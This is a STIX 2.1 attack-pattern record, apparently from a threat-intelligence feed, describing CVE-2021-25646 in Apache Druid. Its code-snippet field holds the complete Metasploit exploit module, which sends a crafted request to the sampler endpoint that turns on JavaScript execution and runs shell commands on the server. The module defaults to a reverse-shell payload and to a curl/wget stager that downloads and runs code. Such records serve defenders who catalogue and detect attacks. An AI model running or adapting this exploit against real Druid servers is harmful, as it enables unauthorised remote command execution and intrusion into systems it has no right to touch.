{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f45188d9-9c95-4da5-8754-2f62929ef687",
    "created": "2024-08-14T17:04:38.554003Z",
    "modified": "2024-08-14T17:04:38.554007Z",
    "name": "Apache Druid 0.20.0 Remote Command Execution",
    "description": " Apache Druid includes the ability to execute user-provided JavaScript code embedded in various types of requests; however, that feature is disabled by default.  In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request that both enables the JavaScript code-execution feature and executes the supplied code all at once, allowing for code execution on the server with the privileges of the Druid Server process. More critically, authentication is not enabled in Apache Druid by default.  Tested on the following Apache Druid versions:  * 0.15.1 * 0.16.0-iap8 * 0.17.1 * 0.18.0-iap3 * 0.19.0-iap7 * 0.20.0-iap4.1 * 0.20.0 * 0.21.0-iap3 ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/apache_druid_js_rce.rb",
            "external_id": "apache_druid_js_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2021-25646"
        },
        {
            "source_name": "reference",
            "url": "https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Druid 0.20.0 Remote Command Execution',\n        'Description' => %q{\n          Apache Druid includes the ability to execute user-provided JavaScript code embedded in\n          various types of requests; however, that feature is disabled by default.\n\n          In Druid versions prior to `0.20.1`, an authenticated user can send a specially-crafted request\n          that both enables the JavaScript code-execution feature and executes the supplied code all\n          at once, allowing for code execution on the server with the privileges of the Druid Server process.\n          More critically, authentication is not enabled in Apache Druid by default.\n\n          Tested on the following Apache Druid versions:\n\n          * 0.15.1\n          * 0.16.0-iap8\n          * 0.17.1\n          * 0.18.0-iap3\n          * 0.19.0-iap7\n          * 0.20.0-iap4.1\n          * 0.20.0\n          * 0.21.0-iap3\n        },\n        'Author' => [\n          'Litch1, Security Team of Alibaba Cloud', # Vulnerability discovery\n          'je5442804' # Metasploit module\n        ],\n        'Arch' => [ARCH_CMD, ARCH_X86, ARCH_X64],\n        'References' => [\n          ['CVE', '2021-25646'],\n          ['URL', 'https://lists.apache.org/thread.html/rfda8a3aa6ac06a80c5cbfdeae0fc85f88a5984e32ea05e6dda46f866%40%3Cdev.druid.apache.org%3E'],\n          ['URL', 'https://github.com/yaunsky/cve-2021-25646/blob/main/cve-2021-25646.py']\n        ],\n        'DisclosureDate' => '2021-01-21',\n        'License' => MSF_LICENSE,\n        'Platform' => ['unix', 'linux'],\n        'Targets' => [\n          [\n            'Linux (dropper)', {\n              'Platform' => 'linux',\n              'Type' => :linux_dropper,\n              'DefaultOptions' => { 'PAYLOAD' => 'linux/x64/meterpreter/reverse_tcp', 'CmdStagerFlavor' => 'curl' },\n              'CmdStagerFlavor' => %w[curl wget],\n              'Arch' => [ARCH_X86, ARCH_X64]\n            }\n          ],\n          [\n            'Unix (in-memory)', {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Type' => :unix_memory,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse_bash' }\n            }\n          ],\n        ],\n        'DefaultTarget' => 0,\n        'Privileged' => false,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n\n    register_options([\n      Opt::RPORT(8888),\n      OptString.new('TARGETURI', [true, 'The base path of Apache Druid', '/'])\n    ])\n  end\n\n  def execute_command(cmd, _opts = {})\n    gencmd = '/bin/sh`@~-c`@~' + cmd\n    genvar = Rex::Text.rand_text_alpha(8..12)\n    genname = Rex::Text.rand_text_alpha(8..12)\n    vprint_status(\"cmd= #{gencmd}   var=#{genvar}   name=#{genname}\")\n    post_data = {\n      type: 'index',\n      spec: {\n        ioConfig: {\n          type: 'index',\n          firehose: {\n            type: 'local',\n            baseDir: '/etc',\n            filter: 'passwd'\n          }\n        },\n        dataSchema: {\n          dataSource: Rex::Text.rand_text_alpha(8..12),\n          parser: {\n            parseSpec: {\n              format: 'javascript',\n              timestampSpec: {},\n              dimensionsSpec: {},\n              function: \"function(){var #{genvar} = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(\\\"#{gencmd}\\\".split(\\\"`@~\\\")).getInputStream()).useDelimiter(\\\"\\\\A\\\").next();return {timestamp:\\\"#{rand(1..9999999)}\\\",#{genname}: #{genvar}}}\",\n              \"\": {\n                enabled: 'true'\n              }\n            }\n          }\n        }\n      },\n      samplerConfig: {\n        numRows: 10\n      }\n    }.to_json\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, '/druid/indexer/v1/sampler'),\n      'ctype' => 'application/json',\n      'headers' => {\n        'Accept' => 'application/json, text/plain, */*'\n      },\n      'data' => post_data\n    })\n  end\n\n  def check\n    genecho = Rex::Text.rand_text_alphanumeric(16..32).gsub(/A/, 'a')\n\n    vprint_status(\"Attempting to execute 'echo #{genecho}' on the target.\")\n    res = execute_command(\"echo #{genecho}\")\n    unless res\n      return CheckCode::Unknown('Connection failed.')\n    end\n\n    unless res.code == 200\n      return CheckCode::Safe\n    end\n\n    if res.body.include?(genecho)\n      return CheckCode::Vulnerable\n    end\n\n    CheckCode::Unknown('Target does not seem to be running Apache Druid.')\n  end\n\n  def exploit\n    case target['Type']\n    when :linux_dropper\n      execute_cmdstager\n    when :unix_memory\n      execute_command(payload.encoded)\n    end\n  end\n\nend\n",
    "x_mitre_disclosure_date": "2021-01-21",
    "x_mitre_platforms": [
        "unix'"
    ]
}